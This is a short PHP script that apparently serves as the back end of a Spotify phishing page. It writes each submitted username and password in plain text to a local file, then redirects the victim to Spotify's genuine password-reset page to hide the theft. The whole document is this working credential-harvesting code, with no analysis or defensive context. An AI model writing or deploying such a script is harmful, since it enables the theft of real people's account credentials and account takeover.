<?php

file_put_contents("usernames.txt", "Spotify Username: " . $_POST['username'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.spotify.com/us/password-reset/');
exit();
?>